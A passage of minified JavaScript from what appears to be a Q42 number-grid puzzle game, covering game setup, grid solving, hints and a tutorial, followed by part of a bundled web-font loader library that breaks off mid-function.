ye(){Storage.setDataValue("donated",!0),$('[data-action="thanks"]').show(),$('p[data-action="about"]').hide(),$("#donate").hide(),$("#toggleDonateValue").removeClass("link").html(Language.get("Yes")),f=!0,Storage.data.achievementsUnlocked&&Storage.data.achievementsUnlocked.pay_to_win||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.pay_to_win)}function ke(){$("#donate").remove(),$("#toggleDonateValue").remove(),$("#toggleDontae").remove()}function Te(){var e=$.browser.ios?"https://itunes.apple.com/us/app/contranoid/id1027717534?mt=8":$.browser.android?"https://play.google.com/store/apps/details?id=com.q42.contranoid":$.browser.chromeWebStore?"https://chrome.google.com/webstore/detail/contranoid/ineojkjjajpfglpmjnndfioncfjkmmdn":"https://contranoid.com";window.isWebApp||!$.browser.android&&!$.browser.ios?window.open(e,"_blank"):window.open(e,"_system")}function Ce(){z=!(M=!0),$(".screen").hide().removeClass("show"),$("#games").show(),setTimeout((function(){$("#games").addClass("show")}),0),R()}function Se(t){t&&(Se.totalTiles=e.width*e.height,Se.initialEmptyTileCount=e.emptyTileCount,Se.initialTileCount=Se.totalTiles-Se.initialEmptyTileCount);var n=Se.totalTiles-e.emptyTileCount-Se.initialTileCount,i=Math.ceil(n/Se.initialEmptyTileCount*100);$("#percentage .value").html(i+"%")}function $e(){g?($("#toggleHintIcon text").text(Language.get("No")),$('[data-action="help"]').addClass("disabled")):($("#toggleHintIcon text").text(Language.get("Yes")),$('[data-action="help"]').removeClass("disabled").css("display","inline-block"))}function xe(){return Language.get("weekDays")[_e().getDay()]}function _e(){var e,t,n,i,o=new Date;return!r||(e=r.split("-"))&&3==e.length&&(t=+e[2],n=+e[1],i=+e[0],o=new Date(t,n-1,i)),o}function ze(){_=[];var e=Language.get("weekDays")[(new Date).getDay()];$("#weekDay").html(e.toLowerCase())}function De(){return _e().getFullYear()+"-"+(_e().getMonth()+1)+"-"+_e().getDate()}function Ae(){if($("[data-size]").removeClass("done"),m){var e=Storage.getDataValue("today-id");e&&e==De()||(Storage.setDataValue("today-id",De()),Storage.setDataValue("today-progress",{}));var t,n=Storage.getDataValue("today-progress",{});for(t in n)$('[data-size="'+t+'"]').addClass("done")}}this.start=function(t){if(t&&(t.date&&(r=t.date),t.size&&(s=t.size)),setTimeout((function(){Levels.init()}),100),document.addEventListener("backbutton",pe,!1),window.isWebApp||$(document).on(Utils.getEventNames("click"),"#games a",(function(e){return e.preventDefault(),e.stopPropagation(),e.stopImmediatePropagation(),!1})),window.WinJS&&(WinJS.Application.onbackclick=pe),$(document).on(Utils.getEventNames("keydown"),(function(e){return 27==e.keyCode?(pe(),!1):32==e.keyCode?(ue("help"),!1):90==e.keyCode&&(e.metaKey||e.ctrlKey)?(ue("undo"),!1):void 0})),$(document).on(Utils.getEventNames("end"),le),$(document).on(Utils.getEventNames("start"),"#grid td",se),$(document).on(Utils.getEventNames("end"),"#hintMsg, #boardsize",(function(){return Tutorial.active&&Tutorial.nextAllowed()?Tutorial.next():e&&e.hint&&e.hint.active&&e.hint.clear(),!1})),$(document).on(Utils.getEventNames("contextmenu"),(function(e){return e.preventDefault(),e.stopPropagation(),e.stopImmediatePropagation(),!1})),$(window).on("orientationchange",R),Config.skipIntro)ce(F);else if(u)l?ee(l):F();else{if(Config.fastIntro)return $("#title").addClass("no-anim"),$(".hide0").removeClass("hide0"),$(".hide1").removeClass("hide1"),$(".hide-title").removeClass("hide-title"),$(".hide-subtitle").removeClass("hide-subtitle"),void(k=!0);setTimeout((function(){$(".hide0").removeClass("hide0")}),300),setTimeout((function(){$(".hide1").removeClass("hide1")}),1300),setTimeout((function(){$(".hide-title").removeClass("hide-title")}),2300),setTimeout((function(){$(".hide-subtitle").removeClass("hide-subtitle"),k=!0}),3500)}},this.init=function(){window.Analytics&&Analytics.init();var e=+document.location.hash.replace(/#/g,"");0<e&&(u=!0,l=e),Storage.getDataValue("donated",!1)&&ye(),window.Themes&&Themes.init(),Config.hideAboutButton&&$('[data-action="about"], [data-action="in-game-about"]').remove(),!1===Config.newLabel&&$(".new").remove(),!1===Config.twitter&&$('[data-action="tweet"]').remove(),!1===Config.showGamesPage&&($("#apps").attr("data-action","back"),$('.inner[data-action="games"]').remove()),Config.preventExternals&&($("#ohhi, #games, #apps").remove(),$('[data-action="apps"]').attr("data-action","back"),ke()),window.cordova&&cordova.getAppVersion&&cordova.getAppVersion.getVersionNumber().then((function(e){$("[data-version]").html("v "+e+" ")})),p=Storage.getDataValue("showTimeTrial",!1),$("#toggleTimeTrialValue text").text(p?Language.get("Yes"):Language.get("No")),theme=Storage.getDataValue("theme",1),ve(theme),fe((function(e){$("#scorenr").html(e)})),$("#tweeturl, #facebook").hide(),window.isWebApp?u||ke():$("#app, #q42adrow").hide(),Utils.isTouch()?$("html").addClass("touch"):($("html").addClass("web"),$(document).on("mousedown touchstart",".web-link",(function(e){if(Config.preventExternals)return e.stopPropagation(),e.preventDefault(),!1;var t="https://"+$(e.target).html();return window.open(t),!1}))),$("#menugrid [data-size]").each((function(e,t){var n=$(t),i=+n.attr("data-size"),o=T[i-1];n.html(o),n.on(Utils.getEventNames("start"),(function(e){return!Utils.isDoubleTapBug(e)&&void ee(T[$(e.target).closest("[data-size]").attr("data-size")-1])}))})),R(),$(window).on(Utils.getEventNames("resize"),R),$(window).on(Utils.getEventNames("orientationchange"),R),!0!==Config.allowScroll&&$("#container").on(Utils.getEventNames("move"),(function(e){return e.preventDefault(),e.stopPropagation(),!1})),Store.init(),B(),R(),g=Storage.getDataValue("hideHintIcon",!1),$e(),Utils.setColorScheme("#ff384b","#1cc0e0"),window.SocialSharing&&(window.plugins&&window.plugins.socialsharing||SocialSharing.install(),c=h=!0,$("#tweeturl").on(Utils.getEventNames("click"),(function(e){return e.stopPropagation(),e.preventDefault(),setTimeout((function(){window.plugins.socialsharing.shareViaTwitter(q),PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.how_very_social_of_you)}),0),!1})),$("#facebook").on(Utils.getEventNames("click"),(function(e){return e.stopPropagation(),e.preventDefault(),setTimeout((function(){window.plugins.socialsharing.shareViaFacebook(q),PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.how_very_social_of_you)}),0),!1}))),window.isWebApp&&PlayCenter.enabled&&!PlayCenter.isSignedIn&&PlayCenter.autoSignIn();var t,n=window.Config||{};for(t in n)n[t]||$('[data-config="'+t+'"]').hide()},this.startGame=te,this.showTitleScreen=B,this.showGame=H,this.showMenu=F,this.resize=R,this.showAbout=J,this.showApps=Y,this.showSettings=X,this.showMessage=function(e){e&&(M=!(z=!1),$(".screen").hide().removeClass("show"),$("#message").show(),$("#message-body").html(e),setTimeout((function(){$("#message").addClass("show")}),0),R(),window.Marker&&Marker.save("page","message"),clearTimeout(a),$("#playcenter").removeClass("spin"))},this.showOnline=K,this.show0hh1=function(){M=!(z=!1),$(".screen").hide().removeClass("show"),$("#ohhi").show(),setTimeout((function(){$("#ohhi").addClass("show")}),0),R(),window.Marker&&Marker.save("page","0hh1")},this.startTutorial=de,this.checkForLevelComplete=he,this.enableTimer=function(){p=!0},this.disableTimer=function(){p=!0},this.undo=ge,this.logo=function(e){e=e||512,Game.startGame({size:2,empty:[4,3,0,1],full:[0,0,0,0]}),$("body, #container").css("background-color","transparent"),$("#bar, #boardsize").hide(),$("html, body").css("background","#000"),$("#board").css("background","#fff"),$("#container").css("overflow","auto"),$("#feelsize").css("width",e+"px"),Game.resize(),$("#board").css("height",e+"px"),setTimeout((function(){Game.resize(),$("#board").css("height",e+"px"),setTimeout((function(){$("#board #tile-0-1").hide(),$("#board").css("height",e+"px")}),0)}),10)},this.applyColorTheme=ve,this.purchaseReceived=be,this.enableDonatedState=ye,this.gotoContranoid=Te,window.Config&&Config.debug&&(this._test=ae),this.refreshGameAfterLanguageChange=ze,window.__defineGetter__("tile",(function(){return e.tile})),this.__defineGetter__("grid",(function(){return e})),this.__defineGetter__("debug",(function(){return u})),this.__defineGetter__("fullVersion",(function(){return f}))};function Grid(e,t,n){var i=this;n=n||"board";width=e,t=t||e,tiles=[],saveSlots={},renderTOH=0,rendered=!1,noRender=!1,emptyTile=new Tile(-99,i,-99),currentPuzzle=null,tileToSolve=null;var o=i.hint=new Hint(this);function a(e){for(var t=0;t<tiles.length;t++){var n=t%width,o=Math.floor(t/width),a=tiles[t];if(e.call(a,n,o,t,a))break}return i}function r(e,n){return e<0||e>=width||n<0||t<=n?-1:n*width+e}function s(){}function l(e){if(!noRender){if(clearTimeout(renderTOH),e){Game.debug&&console.log("rendering..."),rendered=!1;for(var o='<table data-grid="'+n+'" id="grid" cellpadding=0 cellspacing=0>',a=0;a<t;a++){o+="<tr>";for(var s=0;s<width;s++){var u=r(s,a),h=tiles[u],c="",d="";switch(h.type){case TileType.Value:c=2,d=h.value;break;case TileType.Wall:c=1;break;case TileType.Dot:c=2}o+='<td data-x="'+s+'" data-y="'+a+'" class="'+((s+a%2)%2?"even":"odd")+'"><div id="tile-'+s+"-"+a+'" class="tile tile-'+c+'"><div class="inner">'+d+"</div></div></td>"}o+="</tr>"}return o+="</table>",$("#"+n).html(o),Game.resize(),rendered=!0,i}renderTOH=setTimeout((function(){l(!0)}),0)}}function u(e,n){return e<0||e>=width||n<0||t<=n?null:tiles[r(e,n)]}function h(e,t){var n=!0,i=0,a=null,r=tiles;for(t&&(r=tiles.concat(),Utils.shuffle(r));n&&i++<99;){if(n=!1,function(e){for(var t=0;t<tiles.length;t++)if(tiles[t].type==TileType.Unknown||tiles[t].type==TileType.Dot)return;return 1}())return e&&clearTimeout(renderTOH),!0;for(var l,u,h=0;h<r.length;h++)r[h].info=r[h].collect();for(h=0;h<r.length;h++){if(u=(l=r[h]).collect(l.info),l.isDot()&&!u.unknownsAround&&!t){l.number(u.numberCount,!0),n=HintType.NumberCanBeEntered;break}if(l.isNumber()&&u.unknownsAround){if(u.numberReached){t?a=l:l.close(),n=HintType.ValueReached;break}if(u.singlePossibleDirection){t?a=l:l.closeDirection(u.singlePossibleDirection,!0,1),n=HintType.OneDirectionLeft;break}for(var c in Directions){var d=u.direction[c];if(d.wouldBeTooMuch){t?a=l:l.closeDirection(c),n=HintType.WouldExceed;break}if(d.unknownCount&&d.numberWhenDottingFirstUnknown+d.maxPossibleCountInOtherDirections<=l.value){t?a=l:l.closeDirection(c,!0,1),n=HintType.OneDirectionRequired;break}}if(n)break}if(l.isUnknown()&&!u.unknownsAround&&!u.completedNumbersAround&&0==u.numberCount){t?a=l:l.wall(!0),n=HintType.MustBeWall;break}}if(tileToSolve&&tileToSolve.allowQuickSolve&&l&&tileToSolve.tile.x==l.x&&tileToSolve.tile.y==l.y&&tileToSolve.exportValue==l.getExportValue())return!0;if(t)return o.mark(a,n),!1}return s(),e&&clearTimeout(renderTOH),!1}function c(e){e=e||1,saveSlots[e]={values:[]};for(var t=0;t<tiles.length;t++)saveSlots[e].values.push(tiles[t].value);return i}function d(e){e=e||1;var t=saveSlots[e];if(!t)return console.log("Cannot restore save slot ",e),i;for(var n=0;n<t.values.length;n++)tiles[n].value=t.values[n];return s(),i}function p(e){var t,n=0,i=0,o=tiles.concat();tileToSolve=null,c("full");for(var a=0;a<o.length;a++)tiles[a].isWall()&&i++;for(Utils.shuffle(o),a=0;a<o.length&&n++<6;){if(tileToSove=null,(t=o[a++]).isWall()){if(1==i)continue;i--}tileToSolve={tile:t,exportValue:t.getExportValue(),allowQuickSolve:e},t.clear(),c("breakdown"),h(!0)?(d("breakdown"),n=0):(d("breakdown"),tileToSolve.tile.setExportValue(tileToSolve.exportValue),t.isWall()&&i++)}tileToSolve=null,c("empty")}function f(){var e=[];return a((function(){this.isEmpty&&e.push(this)})),e}this.activateDomRenderer=function(){s=this.render=l,noRender=!1},this.each=a,this.fillDots=function(e){for(var t=0;t<tiles.length;t++){var n=tiles[t];n.type==TileType.Unknown&&n.dot(),n.type==TileType.Value&&e&&n.dot()}return s(),i},this.render=s,this.solve=h,this.number=function(e,t,n){return u(e,t).number(n),s(),i},this.wall=function(e,t){return u(e,t).wall(),s(),i},this.dot=function(e,t){return u(e,t).dot(),s(),i},this.getIndex=r,this.tile=u,this.load=function(e){currentPuzzle=e,width=e.size,t=e.size,tiles=[];for(var n=0;n<e.empty.length;n++){var o=new Tile(e.empty[n],i,n,!0);tiles.push(o)}},this.generate=function(e){var n=e*e;width=t=e;for(var o=0;o<n;o++){var a=new Tile(2*(e-1),i,o);tiles.push(a)}},this.maxify=function(t){for(var n=!0,i=0,o=(t=t||width,[]),a=0;a<tiles.length;a++)(r=tiles[a]).value>t&&o.push(r);for(Utils.shuffle(o);n&&i++<99;)for(n=!1,a=0;a<o.length;a++){var r,l=o[a].x,u=o[a].y;if((r=tiles[u*e+l]).value>t){var c=t,d=r.getTilesInRange(1,c),p=null,f=null;for(Utils.shuffle(d);!p&&d.length;)p=d.pop(),f=f||p;(p=p||f)?(p.wall(!0),function(t){overwriteNumbers=!0;for(var n=0;n<e;n++){var i=tiles[n*e+t.x];i.type==TileType.Unknown&&i.dot(),i.type==TileType.Value&&overwriteNumbers&&i.dot(),(i=tiles[t.y*e+n]).type==TileType.Unknown&&i.dot(),i.type==TileType.Value&&overwriteNumbers&&i.dot()}s()}(p),h(),n=!0):console.log("no cut found for",r.x,r.y,r.value,d,1,c);break}}s()},this.save=c,this.restore=d,this.breakDown=function(){p(!0),h()||(d("full"),p(!1)),d("empty")},this.clear=function(){a((function(e,t,n,i){i.clear()}))},this.getNextLockedInTile=function(){var e=[];return a((function(t,n,i,o){o.isLockedIn()&&e.push(o)})),!!e.length&&Utils.pick(e)},this.getValues=function(){var e=[];return a((function(){e.push(this.getExportValue())})),e},this.isValid=function(e){if(e)return function(){for(var e=0;e<tiles.length;e++){var t=tiles[e];if(t.isEmpty)return!1;if(t.isNumber()){var n=t.collect();if(t.value!=n.numberCount)return console.log(t.x,t.y,t.value,n.numberCount),!1}}return!0}();for(var t=0;t<tiles.length;t++){var n=tiles[t];if(!n.isEmpty)if(1==currentPuzzle.full[t]){if(!n.isWall())return!1}else if(1<currentPuzzle.full[t]&&!n.isNumberOrDot())return!1}return!0},this.mark=function(e,t){return u(e,t).mark(),i},this.unmark=function(e,n){if("number"==typeof e&&"number"==typeof n)return u(e,n).unmark(),i;for(n=0;n<t;n++)for(e=0;e<width;e++)u(e,n).unmark();return i},this.getClosedWrongTiles=function(){for(var e=tiles,t=[],n=0;n<e.length;n++)e[n].info=e[n].collect();for(n=0;n<e.length;n++){var i=e[n],o=i.collect(i.info);i.isNumber()&&o.numberCount!=i.value&&0==o.unknownsAround&&t.push(i)}return t},this.__defineGetter__("tiles",(function(){return tiles})),this.__defineGetter__("width",(function(){return width})),this.__defineGetter__("height",(function(){return t})),this.__defineGetter__("rendered",(function(){return rendered})),this.__defineGetter__("quality",(function(){return Math.round(f().length/(width*t)*100)})),this.__defineGetter__("emptyTileCount",(function(){return f().length})),this.__defineGetter__("emptyTiles",f),this.__defineGetter__("hint",(function(){return o}))}function Tile(e,t,n,i){var o=this,a=-1,r=TileType.Unknown,s=this.x=n%t.width,l=this.y=Math.floor(n/t.width);function u(e){return r=-2==e?(a=e,TileType.Dot):isNaN(e)||e<0||90<e?(a=-1,TileType.Unknown):0==(a=e)?TileType.Wall:TileType.Value,h(),a}function h(){if(t.render){if(t.rendered){var e=$("#tile-"+s+"-"+l),n="",i="";switch(r){case TileType.Value:n=2,i=tile.value;break;case TileType.Wall:n=1;break;case TileType.Dot:n=2}e.removeClass().addClass("tile tile-"+n),e.find(".inner").text(i)}else t.render();return o}}function c(e){switch(e){case TileType.Unknown:r=e,a=-1;break;case TileType.Wall:r=e,a=0;break;case TileType.Dot:r=e,a=-2;break;case TileType.Value:console.log("Error. Don't set tile type directly to TileType.Value.")}h()}function d(){return r==TileType.Dot}function p(){return r==TileType.Value}function f(){return c(TileType.Dot),o}function m(){return c(TileType.Wall),o}function g(){return c(TileType.Unknown),o}function w(e,n){var i=s+e,o=l+n;return t.tile(i,o)}function v(e,t,n){for(var i=o.move(e),a=0;i&&!i.isWall();i=i.move(e)){if(i.isUnknown()){if(a++,!t){i.wall(!0);break}i.dot(!0)}if(n<=a)break}}function b(e){switch(e){case 0:g();break;case 1:m();break;case 2:f();break;default:u(e-2)}}this.id=s+","+l,(i?b:u)(e),this.mark=function(){return $("#tile-"+s+"-"+l).addClass("marked"),o},this.unmark=function(){return $("#tile-"+s+"-"+l).removeClass("marked"),o},this.dot=f,this.wall=m,this.number=function(e){return u(e),o},this.unknown=g,this.isDot=d,this.isWall=function(){return r==TileType.Wall},this.isNumber=p,this.isNumberOrDot=function(){return p()||d()},this.isUnknown=function(){return r==TileType.Unknown},this.isLockedIn=function(){if(!d())return!1;for(var e in Directions)if(o.move(e)&&!o.move(e).isWall())return!1;return!0},this.collect=function(e){if(e)for(var t in Directions){for(l=e.direction[t],s=o.move(t);s&&!s.isWall();s=s.move(t))s.isNumber()&&s.info.numberReached&&(e.completedNumbersAround=!0);if(p()&&!e.numberReached&&l.unknownCount)for(var n in l.maxPossibleCountInOtherDirections=0,Directions)n!=t&&(l.maxPossibleCountInOtherDirections+=e.direction[n].maxPossibleCount)}else{for(var t in e={unknownsAround:0,numberCount:0,numberReached:!1,canBeCompletedWithUnknowns:!1,completedNumbersAround:!1,singlePossibleDirection:null,direction:{}},Directions)e.direction[t]={unknownCount:0,numberCountAfterUnknown:0,wouldBeTooMuch:!1,maxPossibleCount:0,maxPossibleCountInOtherDirections:0,numberWhenDottingFirstUnknown:0};var i=null,r=0;for(t in Directions)for(var s=o.move(t);s&&!s.isWall();s=s.move(t)){var l=e.direction[t];s.isUnknown()?(l.unknownCount||l.numberWhenDottingFirstUnknown++,l.unknownCount++,l.maxPossibleCount++,e.unknownsAround++,p()&&i!=t&&(r++,i=t)):(s.isNumber()||s.isDot())&&(l.maxPossibleCount++,l.unknownCount?p()&&1==l.unknownCount&&(l.numberCountAfterUnknown++,l.numberWhenDottingFirstUnknown++,l.numberCountAfterUnknown+1>a&&(l.wouldBeTooMuch=!0)):(e.numberCount++,l.numberWhenDottingFirstUnknown++))}1==r&&(e.singlePossibleDirection=i),p()&&a==e.numberCount?e.numberReached=!0:p()&&a==e.numberCount+e.unknownsAround&&(e.canBeCompletedWithUnknowns=!0)}return 1==r&&(e.singlePossibleDirection=i),p()&&a==e.numberCount?e.numberReached=!0:p()&&a==e.numberCount+e.unknownsAround&&(e.canBeCompletedWithUnknowns=!0),e},this.traverse=w,this.right=function(){return w(1,0)},this.left=function(){return w(-1,0)},this.up=function(){return w(0,-1)},this.down=function(){return w(0,1)},this.move=function(e){switch(e){case Directions.Right:return w(1,0);case Directions.Left:return w(-1,0);case Directions.Up:return w(0,-1);case Directions.Down:return w(0,1)}},this.close=function(e){for(var t in Directions)v(t,e)},this.clear=function(){g()},this.render=h,this.closeDirection=v,this.getTilesInRange=function(e,t){var n,i=[];t=t||e;for(n in Directions)for(var o=0,a=this.move(n);a&&!a.isWall();a=a.move(n))e<=++o&&o<=t&&i.push(a);return i},this.getExportValue=function(){switch(r){case TileType.Unknown:return 0;case TileType.Wall:return 1;case TileType.Dot:return 2;case TileType.Value:return a+2}},this.setExportValue=b,this.__defineGetter__("value",(function(){return a})),this.__defineSetter__("value",u),this.__defineGetter__("type",(function(){return r})),this.__defineSetter__("type",u),this.__defineGetter__("isEmpty",(function(){return-1==a}))}function Hint(e){var t=!1,n=!1,i={type:HintType.None,tile:null};function o(e,t){var i=e,o=Language.get(i);o&&(i=o),t&&(i=i.replace(/\%s/gi,t)),$("#hintMsg").html("<span>"+i+"</span>"),$("html").addClass("showHint"),n=!0,e==HintType.LockedIn&&setTimeout((function(){PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.locked_in)}),2500)}function a(){$("html").removeClass("showHint"),n=!1}this.clear=function(){a(),e&&e.unmark(),t=!1,i={type:HintType.None,tile:null}},this.mark=function(e,n){return!!t&&(i.tile=e,i.type=n,!0)},this.next=function(){var n=e.getClosedWrongTiles();if(n.length){var a=Utils.pick(n),r=a.collect().numberCount>a.value?HintType.ErrorClosedTooLate:HintType.ErrorClosedTooEarly;return a.mark(),void o(r)}var s=e.getNextLockedInTile();if(s)return o(HintType.LockedIn),void s.mark();t=!0,e.solve(!1,!0),i.tile&&(o(i.type),i.tile.mark())},this.show=o,this.hide=a,this.info=i,this.__defineGetter__("active",(function(){return t})),this.__defineSetter__("active",(function(e){t=e})),this.__defineGetter__("visible",(function(){return n}))}var TutorialMessages=[{msg:"t01",tiles:[],next:!0},{msg:"t02",tiles:[],next:!0},{msg:"t03",tiles:[],next:!0},{msg:"t05",tiles:[[0,0]],next:!0},{msg:"t06",tiles:[[1,0,2],[2,0,2]]},{msg:"t07",tiles:[[3,0,1]]},{msg:"t08",tiles:[[3,1]],next:!0},{msg:"t09",tiles:[[2,1,1]]},{msg:"t10",tiles:[[1,1]],next:!0},{msg:"t11",tiles:[[1,2,2],[1,3,2]]},{msg:"t12",tiles:[[0,2,1],[2,2,2],[2,3,1]]},{msg:"",tiles:[],last:!0}],Tutorial=new function(){var e=0,t=!1,n=!1,i=[];function o(){for(var n=0;n<20;n++)$("html").removeClass("tutorial-"+n);if($("#bar [data-action]").hide(),$('#bar [data-action="back"]').show(),e>=Utils.count(TutorialMessages))return s(),t=!1,void setTimeout((function(){Game.checkForLevelComplete()}),1e3);var o=TutorialMessages[++e];msg=Language.get(o.msg),$("html").addClass("tutorial-"+e),r(msg),i=[],Game.grid.unmark(),$(o.tiles).each((function(){i.push(Game.grid.tile(this[0],this[1]))})),setTimeout((function(){a()}),0),o.next,o.last&&(t=!1)}function a(){var t=TutorialMessages[e];t.rows?$(t.rows).each((function(){Game.grid.markRow(this)})):t.cols?$(t.cols).each((function(){Game.grid.markCol(this)})):$(t.tiles).each((function(){Game.grid.mark(this[0],this[1])}))}function r(e){$("#hintMsg").html("<span>"+e+"</span>"),$("html").addClass("showHint"),n=!0}function s(){$("html").removeClass("showHint"),n=!1}function l(){var t=TutorialMessages[e];return!(!t||!t.next)}this.start=function(){$("html").addClass("tutorial"),e=-1,t=!0,Game.startGame({size:4,empty:[4,0,0,0,1,5,0,3,0,0,0,5,3,0,0,1],full:[4,2,2,1,1,5,1,3,1,2,2,5,3,2,1,1],isTutorial:!0}),o(),window.Marker&&Marker.save("tutorial","start")},this.end=function(){t&&window.Marker&&Marker.save("tutorial","end"),$("html").removeClass("tutorial");for(var e=0;e<20;e++)$("html").removeClass("tutorial-"+e);$('#bar [data-action="help"]').removeClass("hidden wiggle"),t=!1},this.next=o,this.show=r,this.hide=s,this.tapTile=function(t){var n;TutorialMessages[e],l()?o():(n=!1,$(i).each((function(){t.x==this.x&&t.y==this.y&&(n=!0)})),n&&(t.isEmpty?t.dot():t.isDot()?t.wall():t.clear(),setTimeout(a,0),function(){var t=!0;$(TutorialMessages[e].tiles).each((function(){var e=this[0],n=this[1],i=Game.grid.tile(e,n),o=this[2];i.getExportValue()!=o?t=!1:setTimeout((function(){i.unmark(),i.system=!0}),0)})),t&&($(i).each((function(){this.system=!0})),o())}()))},this.hintAllowed=function(){return 9<=e},this.nextAllowed=l,this.__defineGetter__("active",(function(){return t})),this.__defineSetter__("active",(function(e){t=e})),this.__defineGetter__("visible",(function(){return n})),this.__defineGetter__("step",(function(){return e}))};!function(e,t){var n=void 0,i=!0,o=null,a=!1;function r(e){return function(){return this[e]}}var s=this;function l(e,t){var i,o=e.split("."),a=s;o[0]in a||!a.execScript||a.execScript("var "+o[0]);for(;o.length&&(i=o.shift());)o.length||t===n?a=a[i]?a[i]:a[i]={}:a[i]=t}function u(e,t,n){return e.call.apply(e.bind,arguments)}function h(e,t,n){if(!e)throw Error();if(2<arguments.length){var i=Array.prototype.slice.call(arguments,2);return function(){var n=Array.prototype.slice.call(arguments);return Array.prototype.unshift.apply(n,i),e.apply(t,n)}}return function(){return e.apply(t,arguments)}}function c(e,t,n){return(c=Function.prototype.bind&&-1!=Function.prototype.bind.toString().indexOf("native code")?u:h).apply(o,arguments)}s.Ba=i;var d=Date.now||function(){return+new Date};function p(e,t){this.G=e,this.u=t||e,this.z=this.u.document,this.R=n}function f(e,n,i){(e=(e=e.z.getElementsByTagName(n)[0])||t.documentElement)&&e.lastChild&&e.insertBefore(i,e.lastChild)}function m(e,t){return e.createElement("link",{rel:"stylesheet",href:t})}function g(e,t){return e.createElement("script",{src:t})}function w(e,t){for(var n=e.className.split(/\s+/),i=0,o=n.length;i<o;i++)if(n[i]==t)return;n.push(t),e.className=n.join(" ").replace(/\s+/g," ").replace(/^\s+|\s+$/,"")}function v(e,t){for(var n=e.className.split(/\s+/),i=[],o=0,a=n.length;o<a;o++)n[o]!=t&&i.push(n[o]);e.className=i.join(" ").replace(/\s+/g," ").replace(/^\s+|\s+$/,"")}function b(e,t){for(var n=e.className.split(/\s+/),o=0,r=n.length;o<r;o++)if(n[o]==t)return i;return a}function y(e){var t;return e.R===n&&((t=e.z.createElement("p")).innerHTML='<a style="top:1px;">w</a>',e.R=/top/.test(t.getElementsByTagName("a")[0].getAttribute("style"))),e.R}function k(e){var t=e.u.location.protocol;return"about:"==t&&(t=e.G.location.protocol),"https:"==t?"https:":"http:"}function T(e,t,n){this.w=e,this.T=t,this.Aa=n}function C(e,t,n,i){this.e=e!=o?e:o,this.o=t!=o?t:o,this.ba=n!=o?n:o,this.f=i!=o?i:o}p.prototype.createElement=function(e,t,n){if(e=this.z.createElement(e),t)for(var i in t){var o,a;t.hasOwnProperty(i)&&("style"==i?(o=e,a=t[i],y(this)?o.setAttribute("style",a):o.style.cssText=a):e.setAttribute(i,t[i]))}return n&&e.appendChild(this.z.createTextNode(n)),e},l("webfont.BrowserInfo",T),T.prototype.qa=r("w"),T.prototype.hasWebFontSupport=T.prototype.qa,T.prototype.ra=r("T"),T.prototype.hasWebKitFallbackBug=T.prototype.ra,T.prototype.sa=r("Aa"),T.prototype.hasWebKitMetricsBug=T.prototype.sa;var S=/^([0-9]+)(?:[\._-]([0-9]+))?(?:[\._-]([0-9]+))?(?:[\._+-]?(.*))?$/;function $(e){e=S.exec(e);var t=o,n=o,i=o,a=o;return e&&(e[1]!==o&&e[1]&&(t=parseInt(e[1],10)),e[2]!==o&&e[2]&&(n=parseInt(e[2],10)),e[3]!==o&&e[3]&&(i=parseInt(e[3],10)),e[4]!==o&&e[4]&&(a=/^[0-9]+$/.test(e[4])?parseInt(e[4],10):e[4])),new C(t,n,i,a)}function x(e,t,n,i,o,a,r,s,l,u,h){this.J=e,this.Ha=t,this.za=n,this.ga=i,this.Fa=o,this.fa=a,this.xa=r,this.Ga=s,this.wa=l,this.ea=u,this.k=h}function _(e,t){this.a=e,this.H=t}C.prototype.toString=function(){return[this.e,this.o||"",this.ba||"",this.f||""].join("")},l("webfont.UserAgent",x),x.prototype.getName=r("J"),x.prototype.pa=r("za"),x.prototype.getVersion=x.prototype.pa,x.prototype.la=r("ga"),x.prototype.getEngine=x.prototype.la,x.prototype.ma=r("fa"),x.prototype.getEngineVersion=x.prototype.ma,x.prototype.na=r("xa"),x.prototype.getPlatform=x.prototype.na,x.prototype.oa=r("wa"),x.prototype.getPlatformVersion=x.prototype.oa,x.prototype.ka=r("ea"),x.prototype.getDocumentMode=x.prototype.ka,x.prototype.ja=r("k"),x.prototype.getBrowserInfo=x.prototype.ja;var z=new x("Unknown",new C,"Unknown","Unknown",new C,"Unknown","Unknown",new C,"Unknown",n,new T(a,a,a));function D(e){var t=P(e.a,/(iPod|iPad|iPhone|Android|Windows Phone|BB\d{2}|BlackBerry)/,1);return""!=t?(/BB\d{2}/.test(t)&&(t="BlackBerry"),t):""!=(e=P(e.a,/(Linux|Mac_PowerPC|Macintosh|Windows|CrOS)/,1))?("Mac_PowerPC"==e&&(e="Macintosh"),e):"Unknown"}function A(e){if((t=(t=P(e.a,/(OS X|Windows NT|Android) ([^;)]+)/,2))||P(e.a,/Windows Phone( OS)? ([^;)]+)/,2))||(t=P(e.a,/(iPhone )?OS ([\d_]+)/,2)))return t;if(t=P(e.a,/(?:Linux|CrOS) ([^;)]+)/,1))for(var t=t.split(/\s/),n=0;n<t.length;n+=1)if(/^[\d\._]+$/.test(t[n]))return t[n];return(e=P(e.a,/(BB\d{2}|BlackBerry).*?Version\/([^\s]*)/,2))?e:"Unknown"}function P(e,t,n){return(e=e.match(t))&&e[n]?e[n]:""}function M(e){if(e.documentMode)return e.documentMode}function I(e){this.va=e||"-"}function L(e,t){this.J=e,this.U=4,this.K="n";var n=(t||"n4").match(/^([nio])([1-9])$/i);n&&(this.K=n[1],this.U=parseInt(n[2],10))}function G(e){return e.K+e.U}function U(e,t,n){this.c=e,this.h=t,this.M=n,this.j="wf",this.g=new I("-")}function N(e){w(e.h,e.g.f(e.j,"loading")),V(e,"loading")}function E(e){v(e.h,e.g.f(e.j,"loading")),b(e.h,e.g.f(e.j,"active"))||w(e.h,e.g.f(e.j,"inactive")),V(e,"inactive")}function V(e,t,n){e.M[t]&&(n?e.M[t](n.getName(),G(n)):e.M[t]())}function j(e,t){this.c=e,this.C=t,this.s=this.c.createElement("span",{"aria-hidden":"true"},this.C)}function W(e,t){for(var n=e.s,i=[],o=t.J.split(/,\s*/),a=0;a<o.length;a++){var r=o[a].replace(/['"]/g,"");-1==r.indexOf(" ")?i.push(r):i.push("'"+r+"'")}i=i.join(","),o="normal",a=t.U+"00","o"===t.K?o="oblique":"i"===t.K&&(o="italic"),i="position:absolute;top:-999px;left:-999px;font-size:300px;width:auto;height:auto;line-height:normal;margin:0;padding:0;font-variant:normal;white-space:nowrap;font-family:"+i+";font-style:"+o+";font-weight:"+a+";",y(e.c)?n.setAttribute("style",i):n.style.cssText=i}function O(e){f(e.c,"body",e.s)}function 